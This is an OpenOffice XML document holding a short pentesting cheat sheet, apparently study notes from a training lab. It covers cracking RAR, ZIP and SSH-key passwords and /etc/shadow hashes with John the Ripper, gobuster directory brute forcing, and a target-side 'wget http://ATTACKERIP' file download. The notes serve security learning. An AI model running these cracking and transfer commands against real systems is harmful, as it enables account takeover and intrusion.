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Arial" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P6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7" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties style:font-name="Arial" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P8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top="0in" fo:margin-bottom="0in" fo:line-height="120%" style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:line-height="120%" style:writing-mode="lr-tb"/>
      <style:text-properties style:font-name="Arial" fo:font-size="12pt" fo:font-weight="normal" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:line-height="120%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T6" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#1155cc" style:text-line-through-style="none" style:font-name="Arial" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:text-blinking="false" fo:background-color="transparent" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Arial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D BOOK</text:p>
      <text:p text:style-name="P3">Short examples for pentesting/hacking</text:p>
      <text:p text:style-name="P1"/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JOHN THE RIPPER<text:line-break/><text:line-break/>RAR2JOHN</text:p>
            <text:p text:style-name="P1">Brute force RAR <text:span text:style-name="T5">password protected file</text:span>.</text:p>
            <text:p text:style-name="P1">rar2john [rar file] &gt; [output file]</text:p>
            <text:p text:style-name="P1">First, extract the hash (password hash) from a RAR file:</text:p>
            <text:p text:style-name="P2">/opt/john/rar2john rarfile.rar &gt; rar_hash.txt</text:p>
            <text:p text:style-name="P1">Brute force file with rar hash:</text:p>
            <text:p text:style-name="P2">john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt</text:p>
            <text:p text:style-name="P1">Unpack pa<text:span text:style-name="T7">ssword protected rar file and enter password found.</text:span></text:p>
            <text:p text:style-name="P5">unrar rarfile.rar</text:p>
            <text:p text:style-name="P5"/>
            <text:p text:style-name="P6">SSH2john</text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T2">Crack the SSH private key from id_rsa and brute force hash to get password</text:span><text:span text:style-name="T3">. ssh2john converts the id_rsa private key, which is used to log in to the SSH session, into a hash format that John can work with.</text:span></text:p>
            <text:p text:style-name="P8">python3 /opt/john/ssh2john.py</text:p>
            <text:p text:style-name="P8">ssh2john [id_rsa private key file] &gt; [output file]</text:p>
            <text:p text:style-name="P8">/opt/john/<text:span text:style-name="T1">ssh2john.py FILE.id_rsa &gt; ssh_hash.txt</text:span></text:p>
            <text:p text:style-name="P8">john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt</text:p>
            <text:p text:style-name="P7"/>
            <text:p text:style-name="P9">Zip2john</text:p>
            <text:p text:style-name="P8">Brute force ZIP password protected file. First create hash from zip file.<text:line-break/>zip2john SOMEZIP.zip &gt; ziphash.txt<text:line-break/>Brute force hash zip file for password.</text:p>
            <text:p text:style-name="P8">john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt</text:p>
            <text:p text:style-name="P8">john --show ziphash.txt</text:p>
            <text:p text:style-name="P7"/>
            <text:p text:style-name="P9">Custom rules John</text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T3">Custom passwords generator.<text:line-break/>In file: /opt/john/john.conf <text:s/>or /etc/john/john.conf <text:s/>create:</text:span></text:p>
            <text:p text:style-name="P8">[List.Rules:THMRules] is used to define the name of your rule</text:p>
            <text:p text:style-name="P8">Az: Takes the word and appends it with the characters you define</text:p>
            <text:p text:style-name="P8">A0: Takes the word and prepends it with the characters you define</text:p>
            <text:p text:style-name="P8">c: Capitalises the character positionally</text:p>
            <text:p text:style-name="P8">[0-9]: Will include numbers 0-9</text:p>
            <text:p text:style-name="P8">[0]: Will include only the number 0</text:p>
            <text:p text:style-name="P8">[A-z]: Will include both upper and lowercase</text:p>
            <text:p text:style-name="P8"><text:soft-page-break/>[A-Z]: Will include only uppercase letters</text:p>
            <text:p text:style-name="P8">[a-z]: Will include only lowercase letters</text:p>
            <text:p text:style-name="P9">Example: [List.Rules:PoloPassword]</text:p>
            <text:p text:style-name="P8">cAz"[0-9] [!£$%@]"</text:p>
            <text:p text:style-name="P8">Utilises the following: c: Capitalises the first letter, Az: Appends to the end of the word, [0-9]: A number in the range 0-9</text:p>
            <text:p text:style-name="P8">[!£$%@]: The password is followed by one of these symbols. <text:line-break/>We cand then call this custom rule with argument using the --rule=PoloPassword flag.</text:p>
            <text:p text:style-name="P10">john --wordlist=[path to wordlist] --rule=PoloPassword [path to hashfile]</text:p>
            <text:p text:style-name="P7"/>
            <text:p text:style-name="P9">UNHASH ROOT USER SHADOW FILE WITH JOHN</text:p>
            <text:p text:style-name="P8">Unshadow /etc/passwd /etc/shadow &gt; passfile.txt</text:p>
            <text:p text:style-name="P8">john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt passfile.txt</text:p>
            <text:p text:style-name="P8">John --show passfile.txt</text:p>
            <text:p text:style-name="P7"/>
            <text:p text:style-name="P9">JOHN THE RIPPER - CRACK HASH</text:p>
            <text:p text:style-name="P12"><text:span text:style-name="T3">john --wordlist=[path to wordlist] --format=[format] [path to hashfile]<text:line-break/>Use hash identifier to check for hash format:<text:line-break/></text:span><text:a xlink:type="simple" xlink:href="https://hashes.com/en/tools/hash_identifier" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://hashes.com/en/tools/hash_identifier</text:a><text:span text:style-name="T3"><text:line-break/>Python hash identifier:</text:span></text:p>
            <text:p text:style-name="P8"><text:a xlink:type="simple" xlink:href="https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master</text:a> </text:p>
            <text:p text:style-name="P11"><text:span text:style-name="T5">Launch hash identifier: python3 </text:span><text:a xlink:type="simple" xlink:href="http://hash-id.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T6">hash-id.py</text:span></text:a><text:a xlink:type="simple" xlink:href="http://hash-id.py/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T5"><text:line-break/></text:span></text:a><text:span text:style-name="T5">Search for John formats - check hash formats for md5:</text:span></text:p>
            <text:p text:style-name="P8">john --list=formats | grep -iF "md5"</text:p>
            <text:p text:style-name="P8">Example full command:</text:p>
            <text:p text:style-name="P10">john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt</text:p>
            <text:p text:style-name="P8">Check cracked hash:</text:p>
            <text:p text:style-name="P13"><text:span text:style-name="T3">Cat /home/user/src/john/run/john.pot</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P2">GOBUSTER CRAWLER BRUTE FORCE SEARCH WEBPAGES</text:p>
            <text:p text:style-name="P1">Using wordlist, search for directories on webserver to detect what pages webserver have.</text:p>
            <text:p text:style-name="P2">gobuster -u http://WEBPAGE -w WORDLIST.txt dir</text:p>
            <text:p text:style-name="P1">-u is used to state the website we're scanning</text:p>
            <text:p text:style-name="P1">-w takes a list of words to iterate through to find hidden pages</text:p>
            <text:p text:style-name="P1">-dir search for directories</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A2" office:value-type="string">
            <text:p text:style-name="P2">TRANSFER FILES USING HTTP</text:p>
            <text:p text:style-name="P1">Start http server with Python (Win) and download files on target with wget request.</text:p>
            <text:p text:style-name="P1">On attacker (win):</text:p>
            <text:p text:style-name="P2">python3 -m http.server 1234 c:/testdir</text:p>
            <text:p text:style-name="P1">-1234 is port where http server will listen, and in last part is directory for http server (not required). For Linux, you could use<text:span text:style-name="T1"> python -m SimpleHTTPServer PORT</text:span></text:p>
            <text:p text:style-name="P1">On target in CMD (win/linux/any):</text:p>
            <text:p text:style-name="P2">wget http://ATTACKERIP:1234/SOMEFILEINROOTDIR</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table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2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2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or </meta:initial-creator>
    <meta:creation-date>2025-07-13T19:54:24.08</meta:creation-date>
    <dc:date>2025-07-15T17:58:54.27</dc:date>
    <dc:creator>Davor </dc:creator>
    <meta:editing-duration>PT14M37S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.15$Win32 OpenOffice.org_project/4115m2$Build-9813</meta:generator>
    <meta:document-statistic meta:table-count="1" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="63" meta:word-count="489" meta:character-count="3463"/>
  </office:meta>
</office:document-meta>
</file>